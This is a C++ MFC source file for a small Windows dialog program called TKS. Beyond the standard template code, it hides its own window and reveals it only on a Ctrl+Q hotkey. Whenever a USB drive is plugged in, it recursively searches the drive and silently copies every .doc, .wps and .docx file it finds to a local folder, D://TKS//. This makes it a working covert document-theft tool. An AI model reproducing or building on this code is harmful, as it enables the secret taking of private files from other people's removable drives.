
// TKSDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "TKS.h"
#include "TKSDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CTKSDlg 对话框




CTKSDlg::CTKSDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CTKSDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CTKSDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CTKSDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &CTKSDlg::OnBnClickedOk)
	ON_WM_DEVICECHANGE()
END_MESSAGE_MAP()


// CTKSDlg 消息处理程序

BOOL CTKSDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CTKSDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CTKSDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CTKSDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CTKSDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	ShowWindow(SW_HIDE);
}

//判断快捷键是否被按下
BOOL CTKSDlg::PreTranslateMessage(MSG* pMsg)   
{  
    // TODO: Add your specialized code here and/or call the base class  
    //用PreTranslateMessage的方法，判断Ctrl+Q是否按下，按下就执行快捷键对应的操作  
    if(pMsg->message == WM_KEYDOWN && pMsg->wParam == 'Q' &&IsCTRLPressed())  
    {  
       ShowWindow(SW_SHOW);
		MessageBox(_T("Ctrl + Q 被按下"));  
        return TRUE;  
    }  
      
    return CDialog::PreTranslateMessage(pMsg);  
}  

BOOL CTKSDlg::OnDeviceChange(UINT nEventType, DWORD dwData)
{
	PDEV_BROADCAST_HDR pDevBroadcastHdr=(PDEV_BROADCAST_HDR)dwData; 
	PDEV_BROADCAST_DEVICEINTERFACE pDevInterface;
	if(nEventType==DBT_DEVICEARRIVAL)
    {
        //Do something
		//MessageBox(_T("USB IN"));
		CString m_str = _T("Z:");
	    for( char ch = 'Z'; ch >='D'; ch--)
		{
			m_str.SetAt(0,ch);
			UINT type = GetDriveType(m_str);
			if(DRIVE_REMOVABLE == type)
			{
				//MessageBox(_T("U 盘 盘符为：")+m_str);
				break;
			}
		}
		Findcp(m_str);

	}
	return CDialog::OnDeviceChange(nEventType, dwData);
}

void CTKSDlg::Findcp(CString fname)
{
	CFileFind finder;
	CString filePath = fname+_T("//*");
	BOOL bFinished =finder.FindFile(filePath);
	while(bFinished)
	{
		bFinished =finder.FindNextFile();
		if(finder.IsDirectory() && !finder.IsDots())  //若是目录则递归调用此方法
		{
			Findcp(finder.GetFilePath());
		}
		else
		{
			CString findname=finder.GetFilePath();
			CString namexx=findname.Right(4);
			CString xx=_T("D://TKS//")+finder.GetFileName();
			if(namexx==_T(".doc")||namexx==_T(".wps")||namexx==_T(".docx"))
			{
				BOOL m=CopyFile(findname,xx,FALSE);
				/*if(m)
					MessageBox(_T("1111"));
				else
					MessageBox(_T("2222"));*/
			}
		}
	}
}
